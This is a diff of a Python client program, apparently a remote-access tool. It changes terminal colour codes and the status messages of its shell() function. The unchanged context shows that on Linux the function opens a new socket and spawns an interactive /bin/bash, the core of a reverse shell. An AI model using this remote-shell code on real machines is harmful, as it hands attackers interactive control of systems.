@@ -36,7 +36,6 @@ white = '\033[0;37m'  # This will turn terminal output white
 light_red = '\033[0;91m'  # This will turn terminal output light red
 light_green = '\033[0;92m'  # This will turn terminal output light green
 light_yellow = '\033[0;93m'  # This will turn terminal output light yellow
-teal = '\033[0;106m'  # This will turn terminal output light blue
 light_purple = '\033[0;95m'  # This will turn terminal output light purple
 turquoise = '\033[0;96m'  # This will turn terminal output turquoise
 stop = '\033[0m'  # This will return terminal output to its normal color.
@@ -232,7 +231,7 @@ def shell(mysocket, delimiter):
             data = '{0}[!]{1} We need more lemon pledge'.format(light_red, stop).encode()
             mysendall(mysocket, data, delimiter)
         elif sys.platform.startswith('linux'):
-            data = '{0}[!]{1} Client received shell request'.format(teal, stop).encode()
+            data = '{0}[!]{1} Client received shell request\n'.format(cyan, stop).encode()
             mysendall(mysocket, data, delimiter)
             time.sleep(1)
             s = socket.socket()
@@ -244,7 +243,7 @@ def shell(mysocket, delimiter):
             # we call the 
             subprocess.call(['/bin/bash', '-i'])
             myrecvall(mysocket, delimiter)
-            data = '{0}[!]{1} Client Shell Finished'.format(teal, stop).encode()
+            data = '{0}[!]{1} Client Shell Finished\n'.format(cyan, stop).encode()
             mysendall(mysocket, data, delimiter)
     except Exception as e:
         type_e = str(type(e)).split()[1].split('<')[0]
